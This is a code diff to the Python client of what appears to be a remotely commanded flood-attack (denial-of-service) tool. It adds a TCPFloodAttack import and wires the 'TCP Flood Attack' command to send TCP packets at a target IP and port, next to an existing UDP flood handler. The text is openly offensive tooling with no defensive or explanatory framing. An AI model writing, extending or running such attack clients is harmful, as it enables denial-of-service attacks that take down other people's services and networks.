@@ -1,4 +1,6 @@
 import pickle
+
+import TCPFloodAttack
 from FloodAttack import *
 
 '''
@@ -27,6 +29,9 @@ class Client(object):
 
         # Needed Objects
         self.udpAttack = FloodAttack()
+
+        # Needed Objects
+        self.tcpAttack = TCPFloodAttack
 
         # Needed Variables
         self.in_data = ''
@@ -83,7 +88,7 @@ class Client(object):
         elif in_data == "ICMP Flood Attack":
             print("Job 5")
         elif in_data == "TCP Flood Attack":
-            print("Job 6")
+            self.tcpAttack.sendTCPPackets(self.targetIP, self.targetPort)
         elif in_data == "UDP Flood Attack":
             self.udpAttack.sendUDPPackets(self.targetIP, self.targetPort)
 
